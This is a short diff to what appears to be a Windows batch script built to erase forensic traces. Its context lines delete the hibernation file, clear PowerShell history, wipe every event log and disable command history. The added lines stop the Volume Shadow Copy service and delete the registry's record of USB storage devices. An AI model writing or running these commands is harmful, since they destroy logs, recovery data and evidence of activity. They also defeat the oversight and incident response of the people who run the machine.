@@ -182,6 +182,8 @@ powercfg.exe /hibernate off
 powershell -Command "Remove-Item -Path "C:\hiberfil.sys" -Force"
 powershell.exe -Command "Clear-History"
 powershell.exe -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath"
+net stop vss /y
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f /va
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
 start explorer.exe 
 doskey /listsize=0
